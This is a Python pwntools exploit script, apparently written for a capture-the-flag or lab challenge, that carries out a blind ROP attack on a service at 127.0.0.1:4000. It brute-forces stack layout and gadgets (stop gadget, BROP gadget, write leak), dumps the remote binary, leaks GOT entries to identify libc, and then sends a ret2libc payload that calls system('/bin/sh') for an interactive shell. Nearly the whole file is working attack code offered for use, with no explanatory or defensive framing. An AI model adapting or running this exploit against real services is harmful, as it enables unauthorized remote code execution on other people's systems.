#!python

from pwn import *
import pwn
from sys import argv
from os import getcwd
from time import sleep

speed = 0.5#.5


context.terminal = ["kitty", "@", "new-window", "--cwd", getcwd()]
context.gdbinit = "/etc/profiles/per-user/darktar/share/pwndbg/gdbinit.py"

r: process = None

u64 = lambda d: pwn.u64(d.ljust(8, b"\0")[:8])
u32 = lambda d: pwn.u32(d.ljust(4, b"\0")[:4])
u16 = lambda d: pwn.u16(d.ljust(2, b"\0")[:2])
sla = lambda a, b: r.sendlineafter(a, b)
sa = lambda a, b: r.sendafter(a, b)
sl = lambda a: (sleep(speed), r.sendline(a))
s = lambda a: (sleep(speed), r.send(a))
recv = lambda: (sleep(speed), r.recv())[1]
recvn = lambda a: (sleep(speed), r.recvn(a))[1]
recvu = lambda a, b=True: (sleep(speed), r.recvuntil(a, b))[1]
clean = lambda: r.clean()
success = lambda a: log.success(a)
fail = lambda a: log.failure(a)
info = lambda a: log.info(a)

gdbscript = '''
    b main
    continue
'''

stop_gadget = 0x400560
brop_gadget = 0x40073a
printf = 0x400500
write_leak = 0x400672

def conn():
    global r
    r = remote('127.0.0.1', 4000)

def leak_stack():
    for i in range(0x100):
        conn()
        recv()
        s(b"a"*i+b"|")
        try:
            recvu(b"|")
            a = recvu(b"B")
            if a != b'':
                a = u64(a)
                info(f"Found: {hex(a)}")
            r.close()
        except:
            print(i)
            print(clean())
            r.close()
            break

def find_stop_gadget():
    global stop_gadget
    for addr in range(0x400000, 0x401000, 0x8):
        payload = b'A' * 40 + p64(addr)
        conn()
        recv()
        s(payload)
        try:
            recvu(b"Hello")
            stop_gadget = addr
            success(hex(stop_gadget)) #0x400560
            break
        except:
            r.close()

def find_brop_gadget():
    global brop_gadget
    for addr in range(0x4006da, 0x4007a0, 0x1):
        payload = b'A' * 40 + p64(addr)
        payload += p64(0) * 6
        payload += p64(stop_gadget)
        conn()
        recv()
        s(payload)
        try:
            recvu(b"Hello")
            brop_gadget = addr
            success(hex(brop_gadget)) #0x40073a
            break
        except:
            r.close()

def find_write_leak():
    global write_leak
    for addr in range(0x400501, 0x400700, 0x1):
        payload = b'A' * 40 + p64(brop_gadget+9) + p64(0x400000)
        payload += p64(addr)
        #payload += p64(stop_gadget)
        conn()
        recv()
        s(payload)
        try:
            data = recv()[39:]
            print(data)
            if b'ELF' in data:
                write_leak = addr
                success(hex(write_leak)) #0x400663
        except:
            r.close()

def leak_address(addr):
    payload = b'A' * 40 + p64(brop_gadget+9)
    payload += p64(addr)     # Address to leak
    payload += p64(write_leak) # Call puts@plt
    conn()
    recv()
    s(payload)
    recvu(b"\x07@")
    data = recvu(b"\n>>>")
    r.close()
    return data

def dump_binary():
    with open("binary_dump.bin", "wb") as f:
        addr = 0x400000
        while(addr<0x401000):
            try:
                leaked_data = leak_address(addr)
                length = len(leaked_data)
                if length == 0:
                    f.write(b"\x00")
                    addr+=1
                else: 
                    f.write(leaked_data)
                    addr+=length
            except:
                f.write(b"\x00")
                addr+=1
                print("Could not retrieve byte at offset " + hex(addr))
    print("Binary dumped to binary_dump.bin")

def leak_libc_ver():
    conn()
    recv()
    payload = b'A' * 40 + p64(brop_gadget+9) + p64(puts_addr) + p64(printf)
    payload += p64(brop_gadget+9) + p64(printf_addr) + p64(printf)
    payload += p64(brop_gadget+9) + p64(read_addr) + p64(printf)
    #payload += p64(stop_gadget)
    s(payload)
    recvu(b"\x07@")
    puts_leak = u64(recvu(b"\n"))
    printf_leak = u64(recvu(b"\n"))
    read_leak = u64(recvu(b"\n"))
    success(hex(puts_leak))
    success(hex(printf_leak))
    success(hex(read_leak))

puts_addr = 0x600fc8
printf_addr = 0x600fd0
read_addr = 0x600fd8

def exploit():
    #leak_stack()
    #find_stop_gadget()
    #find_brop_gadget()
    #find_write_leak()
    #print(leak_address(0x400000))
    #dump_binary()
    #leak_libc_ver() -> libc6_2.19-18+deb8u10_amd64
    recv()
    payload = b'A' * 40 + p64(brop_gadget+9) + p64(puts_addr) + p64(printf)
    payload += p64(stop_gadget)
    s(payload)
    recvu(b"\x07@")
    libc_addr = u64(recvu(b"\n")) - 0x6b990
    system = libc_addr + 0x41490
    bin_sh = libc_addr + 0x1633e8
    payload = b'A' * 40 + p64(brop_gadget+9) + p64(bin_sh) + p64(system)
    s(payload)


    print("good luck pwning :)")
    
    

conn()
exploit()

# good luck pwning :)
r.interactive()
